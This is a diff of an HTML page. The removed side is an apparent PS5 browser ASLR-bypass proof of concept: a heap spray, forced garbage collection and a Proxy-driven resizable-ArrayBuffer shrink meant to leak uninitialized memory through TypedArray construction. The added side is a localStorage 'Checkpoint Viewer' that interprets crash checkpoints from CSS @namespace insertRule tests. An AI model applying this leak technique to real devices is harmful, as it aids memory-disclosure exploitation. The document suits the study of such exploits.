@@ -1,165 +1,152 @@
-<!DOCTYPE html>
-<html>
-<head>
+<!doctype html>
 <meta charset="utf-8">
-<title>PS5 ASLR Bypass — TypedArray Uninitialized Tail Leak</title>
-</head>
-<body>
-<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<title>Checkpoint Viewer</title>
+<style>
+body {
+  background: #111;
+  color: #0f0;
+  font-family: monospace;
+  white-space: pre-wrap;
+  padding: 12px;
+}
+button {
+  background: #222;
+  color: #0f0;
+  border: 1px solid #0f0;
+  padding: 8px;
+  margin: 4px;
+  font-family: monospace;
+}
+.box {
+  border: 1px solid #0f0;
+  padding: 8px;
+  margin-top: 10px;
+}
+.bad {
+  color: #ff5555;
+}
+.good {
+  color: #55ff55;
+}
+.warn {
+  color: #ffff55;
+}
+</style>
+
+<h2>Checkpoint Viewer</h2>
+
+<button onclick="refresh()">Refresh</button>
+<button onclick="clearCheckpoints()">Clear checkpoint keys</button>
+
+<div id="out" class="box"></div>
+
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
+const out = document.getElementById("out");
 
-L('[*] Starting TypedArray uninitialized tail info leak...');
+const interestingPrefixes = [
+  "import_namespace",
+  "namespace_isolation",
+  "namespace_insert",
+  "cssfontface",
+  "fontface",
+  "checkpoint"
+];
 
-// Step 1: Spray heap with objects to fill Gigacage primitive space
-// with recognizable pointer patterns
-L('[*] Step 1: Heap spray with TypedArrays...');
-let spray = [];
-for (let i = 0; i < 5000; i++) {
-    spray.push(new Float64Array(64));
-}
-// Drop references — memory returns to free pool UNZEROED on PlayStation
-spray = null;
-
-// Force GC to return memory to free pool
-L('[*] Forcing GC...');
-for (let i = 0; i < 10; i++) {
-    let tmp = [];
-    for (let j = 0; j < 1000; j++) tmp.push(new ArrayBuffer(4096));
+function line(s, cls = "") {
+  const div = document.createElement("div");
+  if (cls) div.className = cls;
+  div.textContent = s;
+  out.appendChild(div);
 }
 
-// Step 2: Create a resizable ArrayBuffer with a TypedArray view
-L('[*] Step 2: Creating resizable ArrayBuffer...');
-const initialSize = 1024;
-const ab = new ArrayBuffer(initialSize, { maxByteLength: 4096 });
-const source = new Uint8Array(ab, 0, initialSize);
-
-// Fill source with recognizable pattern
-source.fill(0xBB);
-
-// Step 3: Capture the source length (this is the key moment)
-// The constructor will capture source.length = 1024
-// Then allocate destination with DontInitialize (1024 bytes, UNZEROED)
-L('[*] Step 3: Constructing new Uint8Array(source)...');
-L('[*] Source length at capture: ' + source.length);
-
-// We need to shrink the source BETWEEN length capture and setFromTypedArray
-// This is tricky — we need the shrink to happen during construction
-// 
-// The constructor path is:
-//   line 161: length = view->length()     → captures 1024
-//   line 163: createUninitialized(1024)   → allocates UNZEROED
-//   line 169: isIntegerIndexedObjectOutOfBounds → false (still in bounds)
-//   line 180: setFromTypedArray(0, view, 0, 1024) → clamps to current length
-//
-// We can't shrink during construction directly, but we CAN:
-// 1. Use a Proxy or defineProperty on the source to trigger shrink
-//    when the constructor accesses .length
-// 2. Or use a SharedArrayBuffer race (not available on PS5)
-// 3. Or find a different path where the length is cached earlier
-
-// Alternative approach: use a growable ArrayBuffer and shrink it
-// BEFORE the constructor reads length, but AFTER we know the
-// destination will be allocated at the old size
-
-// Actually, let's try the simplest approach first:
-// The constructor captures length, allocates, THEN calls setFromTypedArray
-// If we can trigger a shrink between those two steps...
-
-// Let's try using Object.defineProperty to intercept the length read
-L('\n[*] Step 4: Attempting shrink via Proxy...');
-
-try {
-    // Create a proxy that shrinks the buffer when length is accessed
-    const handler = {
-        get(target, prop) {
-            if (prop === 'length') {
-                // Shrink the buffer HERE — between length capture and allocation
-                L('[!] Length accessed — shrinking buffer!');
-                // Can't shrink ArrayBuffer directly, but we can try resize
-                if (ab.resizable) {
-                    ab.resize(256);
-                    L('[!] Buffer resized to 256');
-                }
-                return target.length;
-            }
-            return Reflect.get(target, prop);
-        }
-    };
-    
-    const proxiedSource = new Proxy(source, handler);
-    
-    // This should trigger the length access via proxy
-    const result = new Uint8Array(proxiedSource);
-    
-    L('[+] Construction succeeded!');
-    L('[+] Result length: ' + result.length);
-    L('[+] Source length after: ' + source.length);
-    
-    // Check if tail contains non-0xBB data (uninitialized memory)
-    let anomalies = 0;
-    let leakBytes = [];
-    for (let i = 0; i < result.length; i++) {
-        if (result[i] !== 0xBB) {
-            anomalies++;
-            if (leakBytes.length < 64) {
-                leakBytes.push(i + ':0x' + result[i].toString(16).padStart(2, '0'));
-            }
-        }
-    }
-    
-    if (anomalies > 0) {
-        L('[!] LEAK DETECTED! ' + anomalies + ' anomalous bytes!');
-        L('[!] First bytes: ' + leakBytes.join(' '));
-        L('[!] These may be leaked heap pointers!');
-    } else {
-        L('[*] No anomalies detected (all 0xBB)');
-        L('[*] The shrink may not have taken effect in time');
-    }
-    
-} catch(e) {
-    L('[!] Proxy approach failed: ' + e.message);
+function isInterestingKey(k) {
+  return interestingPrefixes.some(p => k.toLowerCase().includes(p));
 }
 
-// Step 5: Try without Proxy — just shrink before construction
-L('\n[*] Step 5: Direct shrink approach...');
-try {
-    const ab2 = new ArrayBuffer(1024, { maxByteLength: 4096 });
-    const src2 = new Uint8Array(ab2, 0, 1024);
-    src2.fill(0xCC);
-    
-    // Shrink the buffer
-    ab2.resize(128);
-    L('[*] Buffer resized to 128');
-    L('[*] Source.length after resize: ' + src2.length);
-    
-    // Now construct — source.length should be 128, not 1024
-    // But the source was created with length 1024...
-    // Let's check what happens
-    const result2 = new Uint8Array(src2);
-    L('[+] Result length: ' + result2.length);
-    L('[+] Source length: ' + src2.length);
-    
-    // If result.length > source.length, we have uninitialized tail
-    if (result2.length > src2.length) {
-        L('[!] LENGTH MISMATCH! result=' + result2.length + ' source=' + src2.length);
-        L('[!] Checking tail for leaked data...');
-        let leakFound = false;
-        for (let i = src2.length; i < result2.length; i++) {
-            if (result2[i] !== 0) {
-                L('[!] Byte at ' + i + ': 0x' + result2[i].toString(16));
-                leakFound = true;
-            }
-        }
-        if (leakFound) {
-            L('[!] UNINITIALIZED MEMORY LEAK CONFIRMED!');
-        }
-    }
-} catch(e) {
-    L('[!] Direct approach failed: ' + e.message);
+function refresh() {
+  out.textContent = "";
+
+  line("[*] Checkpoint Viewer");
+  line("[*] origin: " + location.origin);
+  line("[*] time: " + new Date().toISOString());
+  line("");
+
+  const keys = [];
+  for (let i = 0; i < localStorage.length; i++)
+    keys.push(localStorage.key(i));
+
+  const interesting = keys.filter(isInterestingKey).sort();
+
+  if (!interesting.length) {
+    line("[!] No diagnostic checkpoint keys found.", "warn");
+    line("[!] Make sure this page is on the SAME origin as the crash page:", "warn");
+    line("    same protocol + same domain + same port", "warn");
+    return;
+  }
+
+  line("[+] Found diagnostic keys:", "good");
+  line("");
+
+  for (const k of interesting) {
+    let v = "";
+    try { v = localStorage.getItem(k); }
+    catch (e) { v = "[read failed: " + e + "]"; }
+
+    line(k + " = " + v);
+  }
+
+  line("");
+  interpret();
 }
 
-L('\n[*] Test finished.');
+function get(k) {
+  try { return localStorage.getItem(k); }
+  catch (_) { return null; }
+}
+
+function interpret() {
+  const cp =
+    get("import_namespace_checkpoint_v2") ||
+    get("import_namespace_last_checkpoint") ||
+    get("namespace_isolation_last_checkpoint") ||
+    get("namespace_insert_diagnostic_last_checkpoint");
+
+  if (!cp) {
+    line("[?] No known primary checkpoint value found.", "warn");
+    return;
+  }
+
+  line("=== Interpretation ===");
+
+  if (cp.includes("CP-21")) {
+    line("[!] Last checkpoint was BEFORE namespace insertRule.", "bad");
+    line("[!] Strong signal: crash likely happens inside sheet.insertRule('@namespace...', index).", "bad");
+  } else if (cp.includes("CP-22")) {
+    line("[!] namespace insertRule returned, then crash happened later.", "warn");
+    line("[!] Signal: delayed corruption / style update / cleanup after insert.");
+  } else if (cp.includes("forceStyle")) {
+    line("[!] Crash likely around forced style/layout flush.", "warn");
+  } else if (cp.includes("CP-30") || cp.includes("CP-31")) {
+    line("[!] Crash likely around style.remove() / stylesheet cleanup.", "warn");
+  } else if (cp.includes("DONE")) {
+    line("[+] Last run reached DONE. That mode did not reproduce crash.", "good");
+  } else {
+    line("[*] Last checkpoint: " + cp);
+  }
+}
+
+function clearCheckpoints() {
+  const keys = [];
+  for (let i = 0; i < localStorage.length; i++)
+    keys.push(localStorage.key(i));
+
+  for (const k of keys) {
+    if (isInterestingKey(k))
+      localStorage.removeItem(k);
+  }
+
+  refresh();
+}
+
+refresh();
 </script>
-</body>
-</html>
